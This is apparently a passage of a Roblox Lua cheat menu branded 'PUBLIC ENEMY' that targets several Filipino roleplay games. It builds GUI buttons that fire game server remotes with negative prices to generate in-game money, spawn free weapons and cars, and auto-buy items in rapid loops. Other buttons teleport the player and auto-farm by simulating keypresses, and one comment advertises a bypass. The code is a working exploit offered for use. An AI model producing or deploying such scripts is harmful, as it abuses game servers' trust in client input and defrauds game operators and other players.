local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "CAVITE ROLEPLAY BM"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Tactical Knife", "Skorpion", "Heavy Vest", "Heavy Helmet", "MEDKIT", "-"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox")

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- 🧠 NEW SYSTEM (replaces old Purchase event)
local giving = false
toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"

    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            local args = {
                [1] = tonumber(amountBox.Text),
                [2] = selectedGun
            }
            game:GetService("ReplicatedStorage"):WaitForChild("BM_Storage", 9e9)
                :WaitForChild("Remotes", 9e9)
                :WaitForChild("Buy", 9e9)
                :FireServer(unpack(args))
        end
        task.wait(1)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("SPAWN EVOX DOMINION HP (MONSY)", function()
	local args = {
    [1] = "EvoX";
    [2] = "Garage_5";
}

game:GetService("ReplicatedStorage"):WaitForChild("CarSystem", 9e9):WaitForChild("Remotes", 9e9):WaitForChild("SpawnCar", 9e9):InvokeServer(unpack(args))
end)

--// 8 Buttons in Main Menu
addMainMenuButton("DOMINION STORAGE SYSTEM MOVE (MONSY)", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Helper: find remotes
local function getRemotes()
    local aaron = ReplicatedStorage:FindFirstChild("Aaron")
    if not aaron then return nil end
    local shared = aaron:FindFirstChild("Shared")
    if not shared then return nil end
    return shared:FindFirstChild("Remotes")
end

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MoveGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Main Frame (ALL BLACK, Rounded, Draggable)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 200)
frame.Position = UDim2.new(0.5, -180, 0.3, -100)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Parent = screenGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 16)
frameCorner.Parent = frame

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 40)
titleBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
titleBar.BorderSizePixel = 0
titleBar.Parent = frame

local titleBarCorner = Instance.new("UICorner")
titleBarCorner.CornerRadius = UDim.new(0, 16)
titleBarCorner.Parent = titleBar

-- Centered Title: PUBLIC ENEMY
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -50, 1, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "PUBLIC ENEMY"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 22
titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.Parent = titleBar

-- Close Button (X) - WHITE
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 36, 0, 36)
closeButton.Position = UDim2.new(1, -40, 0, 2)
closeButton.BackgroundTransparency = 1
closeButton.Text = "✕"
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 18
closeButton.TextColor3 = Color3.fromRGB(0,0,0)
closeButton.Parent = titleBar

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Draggable Logic
local dragging = false
local dragInput, dragStart, startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        updateInput(input)
    end
end)

-- Mode Button (CENTERED, BLACK + WHITE)
local mode = "Inventory"
local modeButton = Instance.new("TextButton")
modeButton.Size = UDim2.new(0, 160, 0, 32)
modeButton.Position = UDim2.new(0.5, -80, 0, 52)
modeButton.Text = "Mode: "..mode
modeButton.Font = Enum.Font.GothamBold
modeButton.TextSize = 16
modeButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
modeButton.TextColor3 = Color3.fromRGB(0,0,0)
modeButton.BorderSizePixel = 1
modeButton.BorderColor3 = Color3.fromRGB(50, 50, 50)
modeButton.Parent = frame

local modeCorner = Instance.new("UICorner")
modeCorner.CornerRadius = UDim.new(0, 10)
modeCorner.Parent = modeButton

modeButton.MouseButton1Click:Connect(function()
    mode = (mode == "Inventory") and "Storage" or "Inventory"
    modeButton.Text = "Mode: "..mode
end)

-- Item Name Label & Box
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(0, 100, 0, 26)
nameLabel.Position = UDim2.new(0, 16, 0, 92)
nameLabel.BackgroundTransparency = 1
nameLabel.Text = "Item name:"
nameLabel.Font = Enum.Font.Gotham
nameLabel.TextSize = 15
nameLabel.TextColor3 = Color3.fromRGB(0,0,0)
nameLabel.TextXAlignment = Enum.TextXAlignment.Left
nameLabel.Parent = frame

local nameBox = Instance.new("TextBox")
nameBox.Size = UDim2.new(0, 200, 0, 32)
nameBox.Position = UDim2.new(0, 120, 0, 89)
nameBox.PlaceholderText = "- SP - AK47"
nameBox.Text = ""
nameBox.ClearTextOnFocus = false
nameBox.Font = Enum.Font.Gotham
nameBox.TextSize = 15
nameBox.TextColor3 = Color3.fromRGB(0,0,0)
nameBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
nameBox.BorderSizePixel = 1
nameBox.BorderColor3 = Color3.fromRGB(60, 60, 60)
nameBox.Parent = frame

local nameBoxCorner = Instance.new("UICorner")
nameBoxCorner.CornerRadius = UDim.new(0, 8)
nameBoxCorner.Parent = nameBox

-- Quantity Label & Box
local qtyLabel = Instance.new("TextLabel")
qtyLabel.Size = UDim2.new(0, 100, 0, 26)
qtyLabel.Position = UDim2.new(0, 16, 0, 130)
qtyLabel.BackgroundTransparency = 1
qtyLabel.Text = "Quantity:"
qtyLabel.Font = Enum.Font.Gotham
qtyLabel.TextSize = 15
qtyLabel.TextColor3 = Color3.fromRGB(0,0,0)
qtyLabel.TextXAlignment = Enum.TextXAlignment.Left
qtyLabel.Parent = frame

local qtyBox = Instance.new("TextBox")
qtyBox.Size = UDim2.new(0, 80, 0, 32)
qtyBox.Position = UDim2.new(0, 120, 0, 127)
qtyBox.PlaceholderText = "1"
qtyBox.Text = "1"
qtyBox.ClearTextOnFocus = false
qtyBox.Font = Enum.Font.Gotham
qtyBox.TextSize = 15
qtyBox.TextColor3 = Color3.fromRGB(0,0,0)
qtyBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
qtyBox.BorderSizePixel = 1
qtyBox.BorderColor3 = Color3.fromRGB(60, 60, 60)
qtyBox.Parent = frame

local qtyBoxCorner = Instance.new("UICorner")
qtyBoxCorner.CornerRadius = UDim.new(0, 8)
qtyBoxCorner.Parent = qtyBox

-- Move Button (CENTERED BELOW, BLACK + WHITE)
local moveButton = Instance.new("TextButton")
moveButton.Size = UDim2.new(0, 120, 0, 36)
moveButton.Position = UDim2.new(0.5, -60, 0, 155)
moveButton.Text = "Move"
moveButton.Font = Enum.Font.GothamBold
moveButton.TextSize = 16
moveButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
moveButton.TextColor3 = Color3.fromRGB(0,0,0)
moveButton.BorderSizePixel = 1
moveButton.BorderColor3 = Color3.fromRGB(80, 80, 80)
moveButton.Parent = frame

local moveCorner = Instance.new("UICorner")
moveCorner.CornerRadius = UDim.new(0, 10)
moveCorner.Parent = moveButton

-- Status Label (CENTERED BELOW BUTTON)
local status = Instance.new("TextLabel")
status.Size = UDim2.new(0, 310, 0, 24)
status.Position = UDim2.new(0, 25, 0, 170)
status.BackgroundTransparency = 1
status.Text = ""
status.TextSize = 14
status.Font = Enum.Font.Gotham
status.TextColor3 = Color3.fromRGB(0,0,0)
status.TextXAlignment = Enum.TextXAlignment.Center
status.Visible = false
status.Parent = frame

-- Remote Function
local function callMoveRemote(targetMode, itemName, quantity)
    local remotes = getRemotes()
    if not remotes then return false, "Remotes not found" end
    local remoteName = (targetMode == "Inventory") and "MoveToInventory" or "MoveToStorage"
    local remote = remotes:FindFirstChild(remoteName)
    if not remote then return false, "Remote '"..remoteName.."' missing" end
    local ok, res = pcall(function()
        return remote:InvokeServer(itemName, quantity)
    end)
    return ok and true or false, ok and res or tostring(res)
end

-- Move Button Action
moveButton.MouseButton1Click:Connect(function()
    local item = nameBox.Text:gsub("^%s*(.-)%s*$", "%1")
    local q = tonumber(qtyBox.Text) or 0
    if item == "" or q <= 0 then
        status.Text = "Invalid input!"
        status.Visible = true
        task.delay(2, function() status.Visible = false end)
        return
    end
    status.Text = "Sending..."
    status.Visible = true
    local ok, res = callMoveRemote(mode, item, q)
    status.Text = ok and "Success!" or "Error: "..tostring(res)
    task.delay(2, function() status.Visible = false end)
end)
end)

addMainMenuButton("URBAN CITY V3 AUTO OXY (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

--// ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoOxyGUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

--// Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 120)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- ultra black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

--// Rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 15)
uiCorner.Parent = frame

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.Parent = frame

--// Button
local oxyButton = Instance.new("TextButton")
oxyButton.Size = UDim2.new(0, 200, 0, 50)
oxyButton.Position = UDim2.new(0.5, -100, 0, 60)
oxyButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- full black
oxyButton.Text = "OXY"
oxyButton.TextColor3 = Color3.fromRGB(0,0,0)
oxyButton.Font = Enum.Font.GothamBold
oxyButton.TextSize = 20
oxyButton.Parent = frame

--// Button rounded corners
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = oxyButton

--// Button click function
oxyButton.MouseButton1Click:Connect(function()
    oxyRemote:FireServer("APOY", -1)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BUHAY BARANGAY RP (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 250)  -- Adjusted height to fit content better
frame.Position = UDim2.new(0.5, -150, 0.5, -125)  -- Repositioned to center
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "BUHAY BARANGAY RP"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy (Silenced Pistol, Water, Oxy)
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Water", "Water"},
    {"Oxy", "Oxy"}
}

local selectedItem = nil

-- Create Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #items * 30)  -- Adjust the height based on item count
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Create buttons inside the dropdown
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]  -- Store the selected item's internal name
        dropdown.Text = item[1]  -- Update dropdown text to selected item
        dropdownFrame.Visible = false  -- Hide the dropdown after selection
    end)
end

-- Toggle Dropdown Visibility
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Toggle Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 85 + (#items * 30) + 5)  -- Adjusted position for Auto Buy button
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            if selectedItem == "Silenced Pistol" then
                game:GetService("ReplicatedStorage").GiveToolRemote:FireServer("Silenced Pistol", -0)
                print("Auto-buying Silenced Pistol")
            elseif selectedItem == "Desert Eagle" then
                game:GetService("ReplicatedStorage").GiveToolRemote:FireServer("Water", -0)
                print("Auto-buying Desert Eagle")
            elseif selectedItem == "AmmoBox" then
                game:GetService("ReplicatedStorage").GiveToolRemote:FireServer("Oxy", -0)
                print("Auto-buying AmmoBox")
            end
        end
        task.wait(10)  -- Wait 1 second between purchases to prevent spam
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)


addMainMenuButton("KALYEONSE SPAWN GUN (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 250)  -- Adjusted height to fit content better
frame.Position = UDim2.new(0.5, -150, 0.5, -125)  -- Repositioned to center
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "KALYE ONSE"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy (Silenced Pistol, Desert Eagle, AmmoBox)
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Desert Eagle", "Desert Eagle"},
    {"AmmoBox", "AmmoBox"}
}

local selectedItem = nil

-- Create Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #items * 30)  -- Adjust the height based on item count
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Create buttons inside the dropdown
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]  -- Store the selected item's internal name
        dropdown.Text = item[1]  -- Update dropdown text to selected item
        dropdownFrame.Visible = false  -- Hide the dropdown after selection
    end)
end

-- Toggle Dropdown Visibility
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Toggle Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 85 + (#items * 30) + 5)  -- Adjusted position for Auto Buy button
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            if selectedItem == "Silenced Pistol" then
                game:GetService("ReplicatedStorage").MicSystem:FireServer("Silenced Pistol", -0)
                print("Auto-buying Silenced Pistol")
            elseif selectedItem == "Desert Eagle" then
                game:GetService("ReplicatedStorage").MicSystem:FireServer("Desert Eagle", -0)
                print("Auto-buying Desert Eagle")
            elseif selectedItem == "AmmoBox" then
                game:GetService("ReplicatedStorage").MicSystem:FireServer("AmmoBox", -0)
                print("Auto-buying AmmoBox")
            end
        end
        task.wait(0.001)  -- Wait 1 second between purchases to prevent spam
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)


--// 4 Buttons in Roleplay Script
addMainMenuButton("DOMINION REFRESH CLICK 2 TIMES TO REFRESH (MONSY)", function()
-- LocalScript (Client)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")
local TweenService = game:GetService("TweenService")

-- IMAGE (PALITAN MO YUNG ASSET ID DITO)
local imageId = "rbxassetid://109075831425162" -- Your Image

-- GUI CREATION (FULL SCREEN IMAGE 4 SECONDS)
local playerGui = player:WaitForChild("PlayerGui")
local screen = Instance.new("ScreenGui")
screen.ResetOnSpawn = false
screen.IgnoreGuiInset = true -- IMPORTANT (removes ROBLOX top icon bar gap)
screen.Parent = playerGui

local image = Instance.new("ImageLabel")
image.Parent = screen
image.Size = UDim2.new(1, 0, 1, 0) -- Full screen EXACTLY
image.Position = UDim2.new(0, 0, 0, 0)
image.BackgroundColor3 = Color3.new(0,0,0)
image.BackgroundTransparency = 0
image.Image = imageId
image.ImageTransparency = 0

-- Hide after 4 seconds
task.spawn(function()
    task.wait(4.5)
    screen:Destroy()
end)

-- TARGET POSITION
local targetPosition = Vector3.new(-2005.1800537109375, 92.90731811523438, -1774.9578857421875)

-- TELEPORT (SUPER FAST MOVE)
local tweenInfo = TweenInfo.new(
    0.001, -- MAX FAST
    Enum.EasingStyle.Linear,
    Enum.EasingDirection.Out
)

local tween = TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(targetPosition)})
tween:Play()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("AUTO FARM DOMINION BRICK (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Vim = game:GetService("VirtualInputManager")

--// Variables
local autoFarm = false

--// Function para mag-hold ng E
local function holdE(seconds)
    Vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(seconds)
    Vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

--// Function para kunin ang pinakamalapit na brick
local function getNearestBrick()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end

    local root = char.HumanoidRootPart
    local nearest, shortestDist = nil, math.huge

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name == "Brick" and obj:IsA("BasePart") then
            local dist = (obj.Position - root.Position).Magnitude
            if dist < shortestDist then
                shortestDist = dist
                nearest = obj
            end
        end
    end

    return nearest
end

--// Auto Farm Loop
task.spawn(function()
    while task.wait(0.1) do
        if autoFarm then
            local brick = getNearestBrick()
            if brick then
                -- Teleport sa ibabaw ng brick
                LocalPlayer.Character:PivotTo(brick.CFrame + Vector3.new(0, 3, 0))
                task.wait(0.1)
                holdE(2) -- hold E
                task.wait(2) -- cooldown bago ulit
            end
        end
    end
end)

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 250, 0, 100)
Frame.Position = UDim2.new(0.5, -125, 0.5, -50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title.BorderSizePixel = 0
Title.Text = "PUBLIC ENEMY AUTO FARM"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Parent = Frame

local Button = Instance.new("TextButton")
Button.Size = UDim2.new(1, -20, 0, 40)
Button.Position = UDim2.new(0, 10, 0, 40)
Button.BackgroundColor3 = Color3.fromRGB(255,255,255)
Button.BorderSizePixel = 0
Button.Text = "Auto Farm: OFF"
Button.TextColor3 = Color3.fromRGB(0,0,0)
Button.Font = Enum.Font.SourceSansBold
Button.TextSize = 18
Button.Parent = Frame

--// Button Toggle
Button.MouseButton1Click:Connect(function()
    autoFarm = not autoFarm
    Button.Text = "Auto Farm: " .. (autoFarm and "ON" or "OFF")
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PINOY DARK RP (MONSY)", function()
	-- Auto Farm Garbage: instant TP + auto E + Auto Sell All (by button)
-- PUBLIC ENEMY BYPASS CS

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LP = Players.LocalPlayer

